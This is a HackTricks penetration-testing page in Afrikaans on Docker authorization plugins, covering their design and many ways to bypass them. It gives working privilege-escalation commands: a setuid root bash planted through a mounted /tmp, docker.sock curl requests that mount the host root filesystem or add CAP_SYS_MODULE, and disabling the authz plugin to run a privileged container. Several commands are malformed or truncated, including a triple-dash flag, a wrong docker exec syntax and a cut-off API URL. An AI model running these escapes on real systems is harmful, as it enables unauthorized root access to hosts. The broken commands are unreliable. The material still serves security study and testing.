<details>

<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy jou **maatskappy geadverteer wil sien in HackTricks** of **HackTricks in PDF wil aflaai**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Deel jou hacktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.

</details>


**Docker se** out-of-the-box **outorisasiemodel** is **alles of niks**. Enige gebruiker met toestemming om die Docker-daemon te gebruik, kan **enige** Docker-kliënt **opdrag** uitvoer. Dieselfde geld vir oproepers wat die Docker Engine API gebruik om die daemon te kontak. As jy **groter toegangsbeheer** benodig, kan jy **outorisasie-plugins** skep en dit by jou Docker-daemon-konfigurasie voeg. Met behulp van 'n outorisasie-plugin kan 'n Docker-administrator **fynkorrelige toegangspolisse** instel om toegang tot die Docker-daemon te bestuur.

# Basiese argitektuur

Docker Auth-plugins is **eksterne plugins** wat jy kan gebruik om **aksies** wat aan die Docker Daemon gevra word, **toe te laat/weier** afhangende van die **gebruiker** wat dit gevra het en die **gevraagde aksie**.

**[Die volgende inligting is van die dokumentasie](https://docs.docker.com/engine/extend/plugins_authorization/#:~:text=If%20you%20require%20greater%20access,access%20to%20the%20Docker%20daemon)**

Wanneer 'n **HTTP-aanvraag** deur die CLI of via die Engine API na die Docker-daemon gestuur word, stuur die **outentiseringsondersteuning** die aanvraag na die geïnstalleerde **outentiseringsplugin**(s). Die aanvraag bevat die gebruiker (oproeper) en opdragkonteks. Die **plugin** is verantwoordelik vir die besluit of die aanvraag **toegelaat** of **geweier** moet word.

Die volgende sekansdiagramme toon 'n toelaat- en weieringsvloei vir outorisasie:

![Toelaat-outorisasievloei](https://docs.docker.com/engine/extend/images/authz\_allow.png)

![Weieringsoutorisasievloei](https://docs.docker.com/engine/extend/images/authz\_deny.png)

Elke aanvraag wat na die plugin gestuur word, **bevat die geoutentiseerde gebruiker, die HTTP-koppe, en die aanvraag/antwoordliggaam**. Slegs die **gebruikersnaam** en die **outentiseringsmetode** wat gebruik is, word aan die plugin oorgedra. Belangrik is dat **geen** gebruikers **vollegetuigskrifte** of tokens oorgedra word nie. Laastens word **nie alle aanvraag/antwoordliggame** na die outorisasie-plugin gestuur nie. Slegs daardie aanvraag/antwoordliggame waar die `Content-Type` óf `text/*` óf `application/json` is, word gestuur.

Vir opdragte wat die HTTP-verbinding kan oorneem (`HTTP Upgrade`), soos `exec`, word die outorisasie-plugin slegs geroep vir die aanvanklike HTTP-aanvrae. Sodra die plugin die opdrag goedkeur, word outorisasie nie op die res van die vloei toegepas nie. Spesifiek word die stroomdata nie aan die outorisasie-plugins oorgedra nie. Vir opdragte wat 'n stuksgewyse HTTP-antwoord teruggee, soos `logs` en `events`, word slegs die HTTP-aanvraag na die outorisasie-plugins gestuur.

Tydens die verwerking van aanvrae/antwoorde kan sommige outorisasievloei moontlik addisionele navrae aan die Docker-daemon doen. Om sulke vloei te voltooi, kan plugins die daemon API oproep soos 'n gewone gebruiker. Om sulke addisionele navrae moontlik te maak, moet die plugin die middels voorsien om 'n administrateur in staat te stel om behoorlike outentisering- en sekuriteitsbeleide te konfigureer.

## Verskeie Plugins

Jy is verantwoordelik vir die **registreer** van jou **plugin** as deel van die Docker-daemon se **beginproses**. Jy kan **verskeie plugins installeer en aanmekaar koppel**. Hierdie ketting kan georden word. Elke aanvraag aan die daemon gaan in volgorde deur die ketting. Slegs as **alle plugins toegang verleen** tot die hulpbron, word die toegang verleen.

# Plugin-voorbeelde

## Twistlock AuthZ Broker

Die plugin [**authz**](https://github.com/twistlock/authz) stel jou in staat om 'n eenvoudige **JSON**-lêer te skep wat die **plugin** sal **lees** om die aanvrae te outoriseer. Dit gee jou dus die geleentheid om baie maklik te beheer watter API-eindpunte elke gebruiker kan bereik.

Hier is 'n voorbeeld wat Alice en Bob in staat stel om nuwe houers te skep: `{"name":"policy_3","users":["alice","bob"],"actions":["container_create"]}`

Op die bladsy [route\_parser.go](https://github.com/twistlock/authz/blob/master/core/route\_parser.go) kan jy die verband tussen die gevraagde URL en die aksie vind. Op die bladsy [types.go](https://github.com/twistlock/authz/blob/master/core/types.go) kan jy die verband tussen die aksienaam en die aksie vind.

## Eenvoudige Plugin-tutoriaal

Jy kan 'n **maklik verstaanbare plugin** met gedetailleerde inligting oor installasie en foutopsporing hier vind: [**https://github.com/carlospolop-forks/authobot**](https://github.com/carlospolop-forks/authobot)

Lees die `README` en die `plugin.go`-kode om te verstaan hoe dit werk.

# Docker Auth Plugin-omseiling

## Toegang opspoor

Die belangrikste dinge om te ondersoek is **watter eindpunte toegelaat word** en **watter waardes van HostConfig toegelaat word**.

Om hierdie opsporing uit te voer, kan jy die instrument [**https://github.com/carlospolop/docker\_auth\_profiler**](https://github.com/carlospolop/docker\_auth\_profiler) **gebruik**.

## Verbode `run --privileged`

### Minimumvoorregte
```bash
docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash
```
### Uitvoer van 'n houer en dan 'n bevoorregte sessie kry

In hierdie geval het die stelseladministrateur gebruikers verhinder om volumes te monteer en houers met die `--privileged` vlag uit te voer, of enige ekstra vermoë aan die houer te gee:
```bash
docker run -d --privileged modified-ubuntu
docker: Error response from daemon: authorization denied by plugin customauth: [DOCKER FIREWALL] Specified Privileged option value is Disallowed.
See 'docker run --help'.
```
Een gebruiker kan egter **'n skulp binne die lopende houer skep en dit die ekstra voorregte gee**:
```bash
docker run -d --security-opt seccomp=unconfined --security-opt apparmor=unconfined ubuntu
#bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4f1de

# Now you can run a shell with --privileged
docker exec -it privileged bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4f1de bash
# With --cap-add=ALL
docker exec -it ---cap-add=ALL bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4 bash
# With --cap-add=SYS_ADMIN
docker exec -it ---cap-add=SYS_ADMIN bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4 bash
```
Nou kan die gebruiker ontsnap uit die houer deur enige van die [voorheen bespreekte tegnieke](./#privileged-flag) te gebruik en voorregte binne die gasheer te verhoog.

## Monteer Skryfbare Vouer

In hierdie geval het die stelseladministrateur gebruikers verhoed om houers met die `--privileged` vlag te hardloop of enige ekstra vermoë aan die houer te gee, en hy het slegs toegelaat om die `/tmp` vouer te monteer:
```bash
host> cp /bin/bash /tmp #Cerate a copy of bash
host> docker run -it -v /tmp:/host ubuntu:18.04 bash #Mount the /tmp folder of the host and get a shell
docker container> chown root:root /host/bash
docker container> chmod u+s /host/bash
host> /tmp/bash
-p #This will give you a shell as root
```
{% hint style="info" %}
Let daarop dat jy dalk nie die `/tmp`-vouer kan koppel nie, maar jy kan 'n **ander skryfbare vouer** koppel. Jy kan skryfbare gidslys vind deur die volgende te gebruik: `find / -writable -type d 2>/dev/null`

**Let daarop dat nie alle gidslysies in 'n Linux-masjien die suid-bit sal ondersteun nie!** Om te bepaal watter gidslysies die suid-bit ondersteun, voer jy `mount | grep -v "nosuid"` uit. Byvoorbeeld, gewoonlik ondersteun `/dev/shm`, `/run`, `/proc`, `/sys/fs/cgroup` en `/var/lib/lxcfs` nie die suid-bit nie.

Let ook daarop dat as jy `/etc` of enige ander vouer **wat konfigurasie-lêers bevat** kan koppel, jy dit as root vanuit die Docker-houer kan wysig om **privileges te verhoog** (dalk deur `/etc/shadow` te wysig).
{% endhint %}

## Ongekontroleerde API-eindpunt

Die verantwoordelikheid van die stelseladministrateur wat hierdie invoegtoepassing konfigureer, sou wees om te beheer watter aksies en met watter bevoegdhede elke gebruiker kan uitvoer. Daarom, as die administrateur 'n **swartlys**-benadering volg met die eindpunte en die eienskappe, kan hy dalk sommige daarvan **vergeet** wat 'n aanvaller in staat sou stel om **privileges te verhoog**.

Jy kan die Docker API nagaan by [https://docs.docker.com/engine/api/v1.40/#](https://docs.docker.com/engine/api/v1.40/#)

## Ongekontroleerde JSON-Struktuur

### Bind in die wortel

Dit is moontlik dat die stelseladministrateur, toe hy die Docker-firewall gekonfigureer het, 'n belangrike parameter van die [**API**](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList) soos "**Binds**" **vergeet** het.\
In die volgende voorbeeld is dit moontlik om van hierdie konfigurasiefout gebruik te maak om 'n houer te skep en uit te voer wat die wortel (/) vouer van die gasheer koppel:
```bash
docker version #First, find the API version of docker, 1.40 in this example
docker images #List the images available
#Then, a container that mounts the root folder of the host
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "Binds":["/:/host"]}' http:/v1.40/containers/create
docker start f6932bc153ad #Start the created privileged container
docker exec -it f6932bc153ad chroot /host bash #Get a shell inside of it
#You can access the host filesystem
```
{% hint style="warning" %}
Let daarop hoe ons in hierdie voorbeeld die **`Binds`** param gebruik as 'n sleutel op die hoofvlak in die JSON, maar in die API verskyn dit onder die sleutel **`HostConfig`**
{% endhint %}

### Binds in HostConfig

Volg dieselfde instruksies soos met **Binds in root** deur hierdie **versoek** na die Docker API te doen:
```bash
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "HostConfig":{"Binds":["/:/host"]}}' http:/v1.40/containers/create
```
### Monteerings in die wortel

Volg dieselfde instruksies soos met **Bind in die wortel** deur hierdie **versoek** na die Docker API uit te voer:
```bash
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu-sleep", "Mounts": [{"Name": "fac36212380535", "Source": "/", "Destination": "/host", "Driver": "local", "Mode": "rw,Z", "RW": true, "Propagation": "", "Type": "bind", "Target": "/host"}]}' http:/v1.40/containers/create
```
### Monteer in HostConfig

Volg dieselfde instruksies soos met **Binds in root** deur hierdie **versoek** na die Docker API te doen:
```bash
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu-sleep", "HostConfig":{"Mounts": [{"Name": "fac36212380535", "Source": "/", "Destination": "/host", "Driver": "local", "Mode": "rw,Z", "RW": true, "Propagation": "", "Type": "bind", "Target": "/host"}]}}' http:/v1.40/containers/cre
```
## Ongekontroleerde JSON-attribuut

Dit is moontlik dat toe die stelseladministrateur die docker-firewall gekonfigureer het, hy **vergeet het van 'n belangrike attribuut van 'n parameter** van die [**API**](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList) soos "**Capabilities**" binne "**HostConfig**". In die volgende voorbeeld is dit moontlik om van hierdie verkeerde konfigurasie misbruik te maak om 'n houer met die **SYS\_MODULE**-vermoë te skep en uit te voer:
```bash
docker version
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "HostConfig":{"Capabilities":["CAP_SYS_MODULE"]}}' http:/v1.40/containers/create
docker start c52a77629a9112450f3dedd1ad94ded17db61244c4249bdfbd6bb3d581f470fa
docker ps
docker exec -it c52a77629a91 bash
capsh --print
#You can abuse the SYS_MODULE capability
```
{% hint style="info" %}
Die **`HostConfig`** is die sleutel wat gewoonlik die **interessante** **voorregte** bevat om uit die houer te ontsnap. Let egter daarop dat die gebruik van Binds buite dit ook werk en jou mag toelaat om beperkings te omseil.
{% endhint %}

## Plugin Deaktivering

As die **sysadmin** die vermoë om die **plugin** te **deaktiveer** vergeet het, kan jy hiervan gebruik maak om dit heeltemal te deaktiveer!
```bash
docker plugin list #Enumerate plugins

# If you don’t have access to enumerate the plugins you can see the name of the plugin in the error output:
docker: Error response from daemon: authorization denied by plugin authobot:latest: use of Privileged containers is not allowed.
# "authbolt" is the name of the previous plugin

docker plugin disable authobot
docker run --rm -it --privileged -v /:/host ubuntu bash
docker plugin enable authobot
```
Onthou om die invoegtoepassing **weer te aktiveer nadat jy toegang verkry het**, anders sal 'n **herlaai van die docker-diens nie werk nie**!

## Auth Plugin Bypass writeups

* [https://staaldraad.github.io/post/2019-07-11-bypass-docker-plugin-with-containerd/](https://staaldraad.github.io/post/2019-07-11-bypass-docker-plugin-with-containerd/)

## Verwysings

* [https://docs.docker.com/engine/extend/plugins\_authorization/](https://docs.docker.com/engine/extend/plugins\_authorization/)


<details>

<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy jou **maatskappy geadverteer wil sien in HackTricks** of **HackTricks in PDF wil aflaai**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Deel jou hacktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.

</details>
